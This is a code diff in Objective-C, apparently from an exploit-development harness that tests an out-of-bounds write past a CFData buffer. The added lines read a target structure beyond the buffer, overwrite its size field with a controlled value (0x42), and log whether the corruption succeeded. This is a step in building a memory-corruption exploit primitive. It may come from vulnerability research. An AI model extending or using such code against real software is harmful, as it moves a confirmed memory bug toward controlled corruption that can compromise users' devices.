@@ -1392,6 +1392,19 @@ cleanup:
                         i, o, len, before, after]);
                     if (after == 0xDEADBEEFCAFEBABEULL) {
                         scopeNote(r, @"  >>> OOB WRITE CONFIRMED — marker past CFData length boundary!");
+                        // Check if we can corrupt a target field at +0x100
+                        // Target: u32 magic at data+0x100, u32 size at data+0x104
+                        uint32_t tgtMagic = *(uint32_t *)(dataStart + 0x100);
+                        uint32_t tgtSize = *(uint32_t *)(dataStart + 0x104);
+                        scopeNote(r, [NSString stringWithFormat:
+                            @"  target @ data+0x100: magic=0x%08x size=0x%08x", tgtMagic, tgtSize]);
+                        // Write a controlled value to the target size field
+                        *(uint32_t *)(dataStart + 0x104) = 0x00000042;
+                        uint32_t tgtSizeAfter = *(uint32_t *)(dataStart + 0x104);
+                        scopeNote(r, [NSString stringWithFormat:
+                            @"  target size: 0x%08x -> 0x%08x  %s",
+                            tgtSize, tgtSizeAfter,
+                            (tgtSizeAfter == 0x42) ? "CORRUPTED!" : "unchanged"]);
                     }
                 }
 
